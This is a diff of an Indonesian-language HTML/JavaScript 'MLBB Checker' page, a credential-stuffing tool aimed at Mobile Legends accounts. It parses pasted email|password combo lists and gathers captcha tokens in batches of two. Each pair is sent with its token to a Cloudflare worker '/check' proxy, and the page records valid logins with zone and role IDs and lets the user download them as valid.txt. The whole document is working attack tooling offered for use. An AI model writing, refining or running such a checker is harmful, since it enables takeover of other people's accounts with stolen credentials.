@@ -1,51 +1,47 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<title>MLBB Checker Auto Captcha 2 per Batch</title>
+<meta charset="UTF-8">
+<title>MLBB Checker 2 Captcha Auto</title>
 <script src="https://cstaticdun.126.net/load.min.js"></script>
 <style>
   body { font-family: Arial; max-width: 900px; margin: auto; padding: 20px; }
-  textarea { width: 100%; height: 180px; font-family: monospace; }
-  .captcha-root { margin: 12px 0; display: inline-block; vertical-align: top; }
-  #log { background: #111; color: #eee; height: 300px; overflow-y: auto; padding: 10px; font-family: monospace; white-space: pre-wrap; }
-  button { padding: 10px 16px; cursor: pointer; margin-right: 8px; }
+  textarea { width: 100%; height: 150px; font-family: monospace; }
+  #captcha-container { display: flex; justify-content: space-between; margin: 12px 0; }
+  .captcha { width: 48%; min-height: 150px; }
+  #log { background: #111; color: #eee; height: 300px; overflow-y: auto; padding: 10px; font-family: monospace; white-space: pre-wrap; margin-top: 10px; }
   .ok { color: #7CFC00; }
   .bad { color: #FF6B6B; }
   .info { color: #FFD866; }
+  button { padding: 10px 16px; cursor: pointer; margin-top: 10px; }
 </style>
 </head>
 <body>
 
-<h2>MLBB Checker Auto Captcha 2 per Batch</h2>
-<p>Paste list akun (email|password per baris). Proses akan otomatis meminta captcha untuk 2 akun sekaligus.</p>
+<h2>MLBB Checker 2 CAPTCHA Auto</h2>
+<p>Masukkan akun email|password per baris, 2 akun diproses per batch.</p>
 
 <textarea id="combo" placeholder="user1@example.com|Pass123\nuser2@example.com|Pass456"></textarea>
-<br>
-<button id="downloadBtn">Download valid.txt</button>
-<div id="status" style="margin-top:10px;"></div>
 
 <div id="captcha-container">
-  <div id="captcha-root1" class="captcha-root"></div>
-  <div id="captcha-root2" class="captcha-root"></div>
+  <div id="captcha1" class="captcha"></div>
+  <div id="captcha2" class="captcha"></div>
 </div>
+
+<button id="downloadBtn">Download valid.txt</button>
 
 <h3>Log:</h3>
 <div id="log"></div>
 
 <script>
 const CAPTCHA_ID = "fef5c67c39074e9d845f4bf579cc07af";
-const WORKER_URL = "https://mlbbinfo2.bonar7527.workers.dev";
+const WORKER_URL = "https://hidayat.bonar7527.workers.dev";
 
 let combos = [];
 let currentIndex = 0;
-let neCaptchaInstance1 = null;
-let neCaptchaInstance2 = null;
+let tokens = [];
 let validAccounts = [];
-
 const logEl = document.getElementById("log");
-const statusEl = document.getElementById("status");
-const downloadBtn = document.getElementById("downloadBtn");
 
 function appendLog(text, cls) {
   const time = new Date().toLocaleTimeString();
@@ -59,160 +55,87 @@ function appendLog(text, cls) {
 function parseCombos(text) {
   return text.split(/\r?\n/).map(l => l.trim()).filter(Boolean).map(line => {
     if(line.includes("|")) {
-      const [e,p] = line.split("|",2);
-      return { email: e.trim(), password: p.trim() };
+      const [e,p] = line.split("|",2); return { email: e.trim(), password: p.trim() };
     } else if(line.includes(":")) {
-      const [e,p] = line.split(":",2);
-      return { email: e.trim(), password: p.trim() };
-    } else {
-      appendLog(`Format salah dilewati: ${line}`, "info");
-      return null;
-    }
+      const [e,p] = line.split(":",2); return { email: e.trim(), password: p.trim() };
+    } else { appendLog(`Format salah dilewati: ${line}`, "info"); return null; }
   }).filter(Boolean);
 }
 
-function showCaptcha(rootId, instanceHolder) {
+function loadCaptcha(captchaId, elementId) {
   return new Promise((resolve, reject) => {
-    const root = document.getElementById(rootId);
-    root.innerHTML = "";
-
-    if(instanceHolder.value && typeof instanceHolder.value.destroy === "function") {
-      instanceHolder.value.destroy();
-      instanceHolder.value = null;
-    }
-
-    try {
-      initNECaptcha({
-        captchaId: CAPTCHA_ID,
-        element: "#" + rootId,
-        mode: "embed",
-        width: "320px",
-        onReady() {},
-        onVerify(err, data) {
-          if(err || !data || !data.validate) {
-            appendLog("Captcha gagal/Token kosong: " + (err ? JSON.stringify(err) : ""), "info");
-            reject(err || "no token");
-            return;
-          }
-          const token = data.validate;
-          if(instanceHolder.value && typeof instanceHolder.value.destroy === "function") {
-            instanceHolder.value.destroy();
-            instanceHolder.value = null;
-          }
-          resolve(token);
-        },
-        onLoad(instance) {
-          instanceHolder.value = instance;
-        }
-      });
-    } catch(e) {
-      appendLog("Gagal inisialisasi captcha: " + e, "info");
-      reject(e);
-    }
+    if(!window.initNECaptcha) { reject("initNECaptcha missing"); return; }
+    initNECaptcha({
+      captchaId: captchaId,
+      element: elementId,
+      mode: "embed",
+      width: "320px",
+      onVerify: function(err, data){
+        if(err || !data || !data.validate){ reject(err || "No token"); return; }
+        resolve(data.validate);
+      }
+    });
   });
 }
 
-async function checkOneAccount(account, captchaToken) {
-  appendLog(`Proses ${account.email}`, "info");
-  statusEl.textContent = `Checking ${account.email}`;
+async function checkOneAccount(account, token) {
   try {
     const form = new URLSearchParams();
     form.append("email", account.email);
     form.append("password", account.password);
-    form.append("e_captcha", captchaToken);
+    form.append("e_captcha", token);
 
-    const resp = await fetch(WORKER_URL + "/check", {
-      method: "POST",
-      body: form,
-      headers: { "Content-Type": "application/x-www-form-urlencoded" }
-    });
-
-    if(!resp.ok) {
-      appendLog(`HTTP error ${resp.status} untuk ${account.email}`, "bad");
-      return;
-    }
+    const resp = await fetch(WORKER_URL + "/check", { method: "POST", body: form, headers: { "Content-Type": "application/x-www-form-urlencoded" }});
     const data = await resp.json();
-
-    if(data.code === 0 && data.data) {
+    
+    if(data.code === 0 && data.data){
       const zoneId = data.data.zoneId || "N/A";
       const roleId = data.data.roleId || "N/A";
-      appendLog(`VALID => ${account.email} | ZoneID: ${zoneId} | RoleID: ${roleId}`, "ok");
+      appendLog(`VALID => ${account.email} | ZoneID:${zoneId} | RoleID:${roleId}`, "ok");
       validAccounts.push(`${account.email}|${account.password} | ZoneID:${zoneId} | RoleID:${roleId}`);
-    } else if(data.code === 1004) {
-      appendLog(`NOT FOUND => ${account.email}`, "bad");
-    } else if(data.code === 1005) {
-      appendLog(`WRONG PASSWORD => ${account.email}`, "bad");
-    } else {
-      appendLog(`LAINNYA => ${account.email} | ${JSON.stringify(data)}`, "info");
-    }
+    } else if(data.code === 1004) appendLog(`NOT FOUND => ${account.email}`, "bad");
+    else if(data.code === 1005) appendLog(`WRONG PASSWORD => ${account.email}`, "bad");
+    else appendLog(`LAINNYA => ${account.email} | ${JSON.stringify(data)}`, "info");
 
-  } catch(e) {
-    appendLog(`Error pengecekan ${account.email}: ${e}`, "bad");
-  }
-}
-
-function updateTextareaCombos() {
-  const remaining = combos.map(acc => `${acc.email}|${acc.password}`).join("\n");
-  document.getElementById("combo").value = remaining;
+  } catch(e){ appendLog(`Error cek ${account.email}: ${e}`, "bad"); }
 }
 
 async function processBatch() {
-  if(combos.length === 0) {
-    appendLog("Tidak ada akun untuk dicek", "info");
-    statusEl.textContent = "Selesai";
-    return;
-  }
-
-  // ambil 2 akun
-  const batch = combos.splice(0,2);
-  updateTextareaCombos();
-
-  // tampilkan captcha 2 akun
-  appendLog(`Minta captcha untuk: ${batch.map(a=>a.email).join(", ")}`, "info");
-
-  try {
-    const [token1, token2] = await Promise.all([
-      showCaptcha("captcha-root1", {value: neCaptchaInstance1}),
-      showCaptcha("captcha-root2", {value: neCaptchaInstance2})
-    ]);
-
-    await Promise.all([
-      checkOneAccount(batch[0], token1),
-      batch[1] ? checkOneAccount(batch[1], token2) : Promise.resolve()
-    ]);
-
-  } catch(e) {
-    appendLog("Batch captcha gagal: " + e, "bad");
-  }
-
-  // proses batch berikutnya
-  processBatch();
-}
-
-function waitForNECaptcha(callback) {
-  if(window.initNECaptcha) callback();
-  else setTimeout(() => waitForNECaptcha(callback), 200);
-}
-
-waitForNECaptcha(() => {
   combos = parseCombos(document.getElementById("combo").value);
-  processBatch();
-});
+  if(combos.length === 0){ appendLog("Tidak ada akun", "info"); return; }
 
-// Download file valid langsung dari frontend
-downloadBtn.addEventListener("click", () => {
-  if(validAccounts.length === 0) {
-    alert("Belum ada akun valid untuk diunduh.");
-    return;
+  while(currentIndex < combos.length){
+    const batch = combos.slice(currentIndex, currentIndex + 2);
+    appendLog(`Proses akun ${currentIndex+1} - ${currentIndex+batch.length}`, "info");
+
+    try {
+      const [token1, token2] = await Promise.all([loadCaptcha(CAPTCHA_ID, "#captcha1"), loadCaptcha(CAPTCHA_ID, "#captcha2")]);
+      await Promise.all([
+        checkOneAccount(batch[0], token1),
+        batch[1] ? checkOneAccount(batch[1], token2) : null
+      ]);
+    } catch(e){ appendLog("Captcha error: " + e, "bad"); }
+
+    currentIndex += 2;
   }
+
+  appendLog("Selesai semua", "info");
+}
+
+// Download file valid
+document.getElementById("downloadBtn").addEventListener("click", () => {
+  if(validAccounts.length === 0){ alert("Belum ada akun valid"); return; }
   const blob = new Blob([validAccounts.join("\n")], { type: "text/plain" });
-  const url = URL.createObjectURL(blob);
   const a = document.createElement("a");
-  a.href = url;
+  a.href = URL.createObjectURL(blob);
   a.download = "valid.txt";
   a.click();
-  URL.revokeObjectURL(url);
+});
+
+window.addEventListener("load", () => {
+  processBatch();
 });
 </script>
+
 </body>
 </html>
